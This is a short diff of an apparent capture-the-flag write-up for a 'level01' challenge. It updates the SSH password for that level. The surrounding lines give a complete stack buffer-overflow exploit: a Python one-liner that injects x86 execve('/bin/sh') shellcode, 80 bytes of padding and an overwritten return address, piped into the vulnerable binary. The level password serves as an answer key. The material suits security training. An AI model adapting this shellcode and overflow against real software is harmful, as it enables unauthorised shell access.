@@ -165,7 +165,7 @@ password = "A" * 80 + "\x47\xa0\x04\x08"
 
 ```bash
 ssh level01@localhost -p 2222
-# Password: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+# Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
 
 (python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
 ```
